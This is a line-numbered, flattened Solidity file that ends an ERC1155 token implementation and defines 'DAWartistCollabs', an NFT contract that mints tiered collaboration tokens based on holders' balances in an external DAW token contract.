1174         emit TransferBatch(operator, from, address(0), ids, amounts);
1175     }
1176 
1177     /**
1178      * @dev Approve `operator` to operate on all of `owner` tokens
1179      *
1180      * Emits a {ApprovalForAll} event.
1181      */
1182     function _setApprovalForAll(
1183         address owner,
1184         address operator,
1185         bool approved
1186     ) internal virtual {
1187         require(owner != operator, "ERC1155: setting approval status for self");
1188         _operatorApprovals[owner][operator] = approved;
1189         emit ApprovalForAll(owner, operator, approved);
1190     }
1191 
1192     /**
1193      * @dev Hook that is called before any token transfer. This includes minting
1194      * and burning, as well as batched variants.
1195      *
1196      * The same hook is called on both single and batched variants. For single
1197      * transfers, the length of the `id` and `amount` arrays will be 1.
1198      *
1199      * Calling conditions (for each `id` and `amount` pair):
1200      *
1201      * - When `from` and `to` are both non-zero, `amount` of ``from``'s tokens
1202      * of token type `id` will be  transferred to `to`.
1203      * - When `from` is zero, `amount` tokens of token type `id` will be minted
1204      * for `to`.
1205      * - when `to` is zero, `amount` of ``from``'s tokens of token type `id`
1206      * will be burned.
1207      * - `from` and `to` are never both zero.
1208      * - `ids` and `amounts` have the same, non-zero length.
1209      *
1210      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
1211      */
1212     function _beforeTokenTransfer(
1213         address operator,
1214         address from,
1215         address to,
1216         uint256[] memory ids,
1217         uint256[] memory amounts,
1218         bytes memory data
1219     ) internal virtual {}
1220 
1221     function _doSafeTransferAcceptanceCheck(
1222         address operator,
1223         address from,
1224         address to,
1225         uint256 id,
1226         uint256 amount,
1227         bytes memory data
1228     ) private {
1229         if (to.isContract()) {
1230             try
1231                 IERC1155Receiver(to).onERC1155Received(
1232                     operator,
1233                     from,
1234                     id,
1235                     amount,
1236                     data
1237                 )
1238             returns (bytes4 response) {
1239                 if (response != IERC1155Receiver.onERC1155Received.selector) {
1240                     revert("ERC1155: ERC1155Receiver rejected tokens");
1241                 }
1242             } catch Error(string memory reason) {
1243                 revert(reason);
1244             } catch {
1245                 revert("ERC1155: transfer to non ERC1155Receiver implementer");
1246             }
1247         }
1248     }
1249 
1250     function _doSafeBatchTransferAcceptanceCheck(
1251         address operator,
1252         address from,
1253         address to,
1254         uint256[] memory ids,
1255         uint256[] memory amounts,
1256         bytes memory data
1257     ) private {
1258         if (to.isContract()) {
1259             try
1260                 IERC1155Receiver(to).onERC1155BatchReceived(
1261                     operator,
1262                     from,
1263                     ids,
1264                     amounts,
1265                     data
1266                 )
1267             returns (bytes4 response) {
1268                 if (
1269                     response != IERC1155Receiver.onERC1155BatchReceived.selector
1270                 ) {
1271                     revert("ERC1155: ERC1155Receiver rejected tokens");
1272                 }
1273             } catch Error(string memory reason) {
1274                 revert(reason);
1275             } catch {
1276                 revert("ERC1155: transfer to non ERC1155Receiver implementer");
1277             }
1278         }
1279     }
1280 
1281     function _asSingletonArray(uint256 element)
1282         private
1283         pure
1284         returns (uint256[] memory)
1285     {
1286         uint256[] memory array = new uint256[](1);
1287         array[0] = element;
1288 
1289         return array;
1290     }
1291 }
1292 
1293 // File: contracts/DAWartistCollabs.sol
1294 // SPDX-License-Identifier: MIT
1295 /* DAW artists collab */
1296 pragma solidity ^0.8.4;
1297 
1298 interface dawContract {
1299     function balanceOf(address) external returns (uint256);
1300 }
1301 
1302 contract DAWartistCollabs is ERC1155, Ownable {
1303     string public name;
1304     struct MintCondition {
1305         uint256 from;
1306         uint256 to;
1307         uint256 tokenId;
1308         uint256 maxAmount;
1309         uint256 cost;
1310     }
1311     MintCondition[] private currentCondition;
1312     uint256 public currentTokenId;
1313     mapping(uint256 => mapping(address => uint256)) private _mintedTokens;
1314     mapping(uint256 => address[]) private recipients;
1315     mapping(uint256 => string) private _uris;
1316 
1317     // 0xF1268733C6FB05EF6bE9cF23d24436Dcd6E0B35E DAW address
1318     constructor() ERC1155("") {
1319         name = "DAW Artist Collaboration";
1320     }
1321 
1322     function withdraw(uint256 amount) external onlyOwner {
1323         require(address(this).balance >= amount, "Not enough ether");
1324         payable(msg.sender).transfer(amount);
1325     }
1326 
1327     function getBalance() external view onlyOwner returns (uint256) {
1328         return address(this).balance;
1329     }
1330 
1331     function getCurrentCondition()
1332         external
1333         view
1334         returns (MintCondition[] memory)
1335     {
1336         MintCondition[] memory cond = new MintCondition[](
1337             currentCondition.length
1338         );
1339         for (uint256 index = 0; index < cond.length; index++) {
1340             cond[index] = currentCondition[index];
1341         }
1342         return cond;
1343     }
1344 
1345     function getRecipients(uint256 tokenId)
1346         external
1347         view
1348         returns (address[] memory)
1349     {
1350         require(tokenId > 0 && tokenId <= currentTokenId, "Inv id");
1351         return recipients[tokenId];
1352     }
1353 
1354     function setCondition(
1355         MintCondition[] memory conds,
1356         string[] calldata metaUris
1357     ) public onlyOwner {
1358         delete currentCondition;
1359         uint256 min = currentTokenId + 1;
1360         for (uint256 index = 0; index < conds.length; index++) {
1361             if (index != conds.length - 1)
1362                 require(
1363                     conds[index].tokenId + 1 == conds[index + 1].tokenId,
1364                     "Inv ids"
1365                 );
1366             if (min >= conds[index].tokenId) min = conds[index].tokenId;
1367             currentCondition.push(conds[index]);
1368             _uris[conds[index].tokenId] = metaUris[index];
1369             currentTokenId++;
1370         }
1371         require(min == currentTokenId + 1 - conds.length, "Inv min-max ids");
1372         // [[1,1,1,1,0],[2,5,2,1,0],[6,10,3,1,0],[11,24,4,1,0],[25,10000,5,1,0]],["ipfs://QmfC2mGYfyuQvEvNiKL8aW2FEoGiiGx2NS43jYQjTqJasT/1.json","ipfs://QmfC2mGYfyuQvEvNiKL8aW2FEoGiiGx2NS43jYQjTqJasT/2.json","ipfs://QmfC2mGYfyuQvEvNiKL8aW2FEoGiiGx2NS43jYQjTqJasT/3.json","ipfs://QmfC2mGYfyuQvEvNiKL8aW2FEoGiiGx2NS43jYQjTqJasT/4.json","ipfs://QmfC2mGYfyuQvEvNiKL8aW2FEoGiiGx2NS43jYQjTqJasT/5.json"]
1373     }
1374 
1375     function mint(uint256 amount) external payable {
1376         require(amount > 0, "Ivalid amount");
1377         uint256 dawBalance = dawContract(
1378             0xF1268733C6FB05EF6bE9cF23d24436Dcd6E0B35E
1379         ).balanceOf(msg.sender);
1380         MintCondition memory cond = _getCondition(dawBalance, amount);
1381         if (_mintedTokens[cond.tokenId][msg.sender] == 0) {
1382             require(msg.value == cond.cost, "Not enough ether");
1383             recipients[cond.tokenId].push(msg.sender);
1384         }
1385         _mintedTokens[cond.tokenId][msg.sender] += amount;
1386         _mint(msg.sender, cond.tokenId, amount, "");
1387     }
1388 
1389     function _getCondition(uint256 _balance, uint256 amount)
1390         public
1391         view
1392         returns (MintCondition memory)
1393     {
1394         for (uint256 index = 0; index < currentCondition.length; index++) {
1395             MintCondition memory _condition = currentCondition[index];
1396             if (
1397                 _balance >= _condition.from &&
1398                 _balance <= _condition.to &&
1399                 _mintedTokens[_condition.tokenId][msg.sender] + amount <=
1400                 _condition.maxAmount
1401             ) {
1402                 return _condition;
1403             }
1404         }
1405         revert("Can't mint");
1406     }
1407 
1408     function setUri(uint256 _tokenId, string calldata _uri) public onlyOwner {
1409         _uris[_tokenId] = _uri;
1410     }
1411 
1412     function uri(uint256 tokenId) public view override returns (string memory) {
1413         // Tokens minted above the supply cap will not have associated metadata.
1414         require(
1415             tokenId > 0 && tokenId <= currentTokenId,
1416             "ERC1155Metadata: URI query for nonexistent token"
1417         );
1418         return _uris[tokenId];
1419     }
1420 }